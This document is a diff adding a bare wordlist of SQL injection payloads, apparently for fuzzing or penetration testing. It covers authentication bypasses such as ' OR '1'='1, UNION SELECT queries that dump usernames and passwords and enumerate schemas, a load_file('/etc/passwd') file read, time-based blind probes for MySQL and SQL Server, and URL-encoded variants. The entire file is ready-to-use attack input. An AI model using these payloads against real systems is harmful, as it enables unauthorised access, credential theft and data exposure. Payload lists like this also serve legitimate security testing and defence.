@@ -1,0 +1,69 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' # 
+' OR '1'='1' { 
+' OR '1'='1' < 
+') OR ('1'='1
+') OR ('1'='1' --
+") OR ("1"="1
+"); OR ("1"="1
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT username, password, NULL FROM users --
+' UNION SELECT table_name, column_name, NULL FROM information_schema.columns --
+' UNION SELECT schema_name, table_name, column_name FROM information_schema.columns --
+' UNION SELECT @@version, NULL, NULL --
+' UNION SELECT database(), NULL, NULL --
+' UNION SELECT user(), NULL, NULL --
+' UNION SELECT 1, load_file('/etc/passwd'), 3 --
+' UNION SELECT 1, @@hostname, 3 --
+' UNION SELECT 1, concat(username, ':', password), 3 FROM users --
+' AND '1'='1
+' AND '1'='2
+' AND 1=1 --
+' AND 1=2 --
+') AND ('1'='1
+') AND ('1'='2
+") AND ("1"="1
+") AND ("1"="2
+' OR SLEEP(5) --
+' OR SLEEP(10) --
+' OR BENCHMARK(1000000,MD5('test')) --
+' AND IF(1=1, SLEEP(5), 0) --
+' AND IF(1=2, SLEEP(5), 0) --
+'; WAITFOR DELAY '0:0:5' --
+'; IF (1=1) WAITFOR DELAY '0:0:5' --
+' OR IF(1=1, SLEEP(5), 0) --
+' OR IF(1=2, SLEEP(5), 0) --
+' OR 1=1 LIMIT 1 OFFSET 1 --
+' OR 1=1 WAITFOR DELAY '0:0:5' --
+' OR 1=1 ORDER BY 1 --
+' OR 1=1 UNION ALL SELECT NULL, NULL, NULL --
+' OR 1=1 UNION SELECT NULL, username, password FROM users --
+' OR 1=1 UNION SELECT NULL, table_name, column_name FROM information_schema.columns --
+' OR 1=1 UNION SELECT NULL, database(), version() --
+' OR 1=1 UNION SELECT NULL, load_file('/etc/passwd'), NULL --
+%27%20OR%20%271%27%3D%271
+%27%20OR%20%271%27%3D%271%27%20-- 
+%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%20-- 
+%27%20OR%201=1%20-- 
+%27%20OR%201=1%20/* 
+%27%20OR%201=1%20#
+%27%20OR%201=1%20/**/
+%27%20OR%201=1%20--%20-
+%27%20OR%201=1%3B%20-- 
+%27%20OR%201=1%3B%20/* 
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1' #
+' OR '1'='1' /**/
+' OR '1'='1' -- -
+' OR '1'='1'; --
+' OR '1'='1'; /*
+' OR '1'='1'/* 
+' OR EXISTS(SELECT * FROM users WHERE username='admin') --
+' OR (SELECT COUNT(*) FROM users) > 0 --
+' OR 1=1 AND SLEEP(5) --
+' OR 1=1 AND (SELECT MIN(name) FROM sysobjects WHERE xtype = 'U') --
+' OR 1=1 AND (SELECT TOP 1 name FROM syscolumns) --
+' OR 1=1 AND (SELECT TOP 1 name FROM sqlite_master WHERE type='table') --
